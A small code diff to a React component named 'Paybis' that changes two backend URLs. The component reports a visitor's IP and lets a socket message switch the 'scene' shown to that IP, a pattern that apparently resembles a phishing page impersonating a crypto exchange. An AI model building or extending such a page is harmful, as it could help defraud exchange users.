@@ -16,7 +16,7 @@ export default function Paybis({ ip, socket }) {
 
   useEffect(() => {
     async function login() {
-      await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app:3333/login", {
+      await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app/login", {
         corretora: "paybis",
         ip: ip,
       });
@@ -31,7 +31,7 @@ export default function Paybis({ ip, socket }) {
 
       if (ip === ipRecebido) {
         async function AtualizaCena() {
-          await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app:3333/atualizacena", {
+          await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app/atualizacena", {
             cena: cenaRecebida,
             ip: ipRecebido,
           });
